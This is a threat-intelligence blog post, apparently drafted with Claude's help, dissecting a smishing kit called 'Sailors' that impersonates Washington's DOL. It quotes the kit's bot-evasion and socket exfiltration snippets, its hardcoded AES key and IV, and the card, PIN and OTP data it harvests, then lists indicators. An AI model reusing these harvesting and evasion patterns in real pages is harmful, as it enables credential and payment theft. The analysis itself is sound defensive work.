---
date: "2026-03-26T00:00:00Z"
title: Dissecting a WA DOL smishing kit
slug: wa-dol-smishing-kit
---

*Disclaimer: the analysis and most of the writing in this post were done by Claude. I wanted to get this out quickly, I've read every word, and I think Claude did a great job describing the findings.*

Yesterday I got this text message:

> WA DOL | STATUTORY NOTICE: Vehicle Violation Delinquency
>
> Notice is hereby given of an unpaid vehicle violation on your record. This is the final administrative notification before sanctions are applied. Pursuant to RCW 46.63, the following actions will be taken if payment is not received by March 26, 2026:
>
> * Record Encumbrance: A formal lien or block on your registration record.
> * Renewal Bar: Total restriction from renewing vehicle tabs or registrations.
> * Penalty Accumulation: Addition of non-waivable processing and late penalties.
> * Third-Party Transfer: Compulsory assignment of debt to a collection agency.
>
> Action Required: Please remit payment via the official WA portal to ensure compliance:
>
> hxxps://wa.gov-ngf[.]cfd/[redacted]

The domain is `wa.gov-ngf.cfd` - the subdomain is designed to look like it begins with `wa.gov`, and `.cfd` is a cheap new gTLD that shows up frequently in smishing (SMS-based phishing) infrastructure. The URL includes a query parameter that I suspect is a per-victim tracking token embedded in each outgoing SMS, letting the operator correlate clicks back to specific phone numbers.

I clicked the link and ended up on a polished fake DOL payment page.

Opening the URL in a desktop browser returned a 404. The same URL on my phone loaded fine. My guess was User-Agent filtering. I tried the laziest possible thing first:

```sh
curl https://wa.gov-ngf.cfd/[redacted] -H "User-Agent: iPhone"
```

The `var` parameter wasn't required - the server only checks the User-Agent.

## The kit

The page is a Vue 3 single-page application, bundled with Vite. Two JavaScript files ship with it: a main bundle (~967 KB) and a smaller obfuscated support bundle (~300 KB) processed with [javascript-obfuscator](https://obfuscator.io). The obfuscated file uses the string-array shuffle technique - a rotating lookup table with a checksum-calibrated shuffle loop at the top - that `javascript-obfuscator` has used for years. [synchrony/deobfuscator](https://github.com/relative/synchrony) decodes most of the string arrays; it hit errors on the primary one, which required some manual work.

{{< figure src="/images/smishing-ticket.png" width="360" alt="Screenshot of the fake WA DOL toll violation notice" >}}

## Bot detection and exfiltration

If you submit data to this page and watch the Network tab in Chrome DevTools, no requests appear. The most likely reason is bot detection. Before the socket opens, the kit runs [@fingerprintjs/botd](https://github.com/fingerprintjs/BotD):

```js
const detectBot = async () => {
    const t = await load();
    return { isSpider: (await t.detect()).bot }
};
```

If `isSpider` comes back true, `connect()` is never called. The page renders and the form works; the socket just never connects. Having DevTools open is itself a detectable signal, which may be sufficient to suppress the connection entirely.

When the socket does connect, it goes back to the same origin the page was served from:

```js
const SOCKET_URL = window.location.protocol + "//" + window.location.host + "/";
```

The frames are AES-CBC encrypted with a key and IV hardcoded as static string literals in the bundle - not derived from anything dynamic. Resolving the obfuscated string array yields:

```
KEY: ZQMWLSPXJRDHKTNV
IV:  YFBCUENAGPQLXJWR
```

Any deployment sharing this bundle would use the same key. Whether the kit vendor ships the same bundle to all customers or customizes it per deployment isn't something we can determine from a single sample - but the key is at minimum static for this deployment.

## How the operator interacts

Once a victim connects, the socket sends the entire form state to the operator on every field change:

```js
socket.emit("message", encrypt(JSON.stringify({ event: "changleField", data: formData })))
```

(The typo "changleField" appears consistently throughout the codebase.)

The operator also receives a notification the first time a card number or account number is entered.

The server can push commands back to the victim's browser in real time, walking the victim through additional verification steps: phone OTP, email OTP, ATM PIN, CVV, an app authenticator code, or custom code inputs. The success page and error states are also operator-triggered. The operator sits between the victim and the real bank, relaying credentials as they're entered.

## What it collects

Beyond card number and CVV, the kit collects:

- ATM/debit PIN
- Phone number and email address
- OTP codes (phone, email, app authenticator)
- Bank account number and routing number
- Cardholder name

Collecting routing and account numbers alongside card data suggests ACH/debit targeting beyond card-present fraud.

## "Sailors"

The kit's internal name appears to be **Sailors**: `sailorsConfig`, `STORAGE_KEY = "sailors_config"`, `STORAGE_KEY = "sailors_form..."`, and CSS classes prefixed `sailors-input-*`. I didn't find any existing public writeups using this name or describing this kit.

The codebase contains Chinese-language error strings - `"解密异常!"` ("decryption exception") and `"为空"` ("is empty"). It fits within the broader Chinese smishing kit ecosystem but doesn't match any documented family. The closest relatives are [Xiū gǒu](https://www.netcraft.com/blog/doggo-threat-actor-analysis) (Vue.js frontend, Chinese developer artifacts, government impersonation) and the [Smishing Triad / Lighthouse](https://www.resecurity.com/blog/article/smishing-triad-targeted-usps-and-us-citizens-for-data-theft) cluster (SMS lures, US government impersonation), but both differ significantly in backend architecture and exfil mechanism. Neither uses Socket.io or FingerprintJS BotD as far as I can tell from public reporting.

Each victim is assigned a UUID on first visit, stored in AES-encrypted localStorage and passed as a query parameter on the socket connection (`?uuid=...`). The `index.html` includes a `<meta name="keywords">` tag containing a 96-character hex string that the frontend JavaScript never reads - likely a per-deployment identifier consumed server-side.

## Infrastructure

The domain was registered on 2026-03-25 - the same day I received the SMS - through Gname, with Gname's own nameservers (`share-dns.com`). `wa.gov-ngf.cfd` resolves directly to `43.110.18.218`, a Tencent Cloud IP (AS132203, Shenzhen). There's no CDN layer.

CT logs show three distinct Let's Encrypt certificates issued for `wa.gov-ngf.cfd` on 2026-03-25, with `not_before` timestamps at roughly 13:55, 17:38, and 18:26 UTC - three provisioning events in ~4.5 hours on the day the domain was registered.

I filed an abuse report with Gname and haven't taken any other action against the domain. (UPDATE: Gname were quick to take this domain down, and another I have reported to them, though threat actors seem to be registering them much faster than manual abuse reports can get them suspended.)

## Indicators

| Type | Value |
|---|---|
| Domain | `wa.gov-ngf.cfd` |
| Hosting IP | `43.110.18.218` (Tencent Cloud AS132203) |
| Registrar | Gname.com |
| Domain registered | 2026-03-25 |
| Internal name | `Sailors` |
| localStorage key | `sailors_config` |
| localStorage key | `sailors_form*` |
| CSS class prefix | `sailors-input-*` |
| Socket.io event (typo) | `changleField` |
| Bot detection library | `@fingerprintjs/botd` |
| Crypto library | CryptoJS AES-CBC |
| Socket encryption key | `ZQMWLSPXJRDHKTNV` |
| Socket encryption IV | `YFBCUENAGPQLXJWR` |
| Frontend framework | Vue 3 / Vite |
| C2 mechanism | Socket.io, same origin as phishing page |
| Server-side evasion | 404 to non-mobile User-Agent |
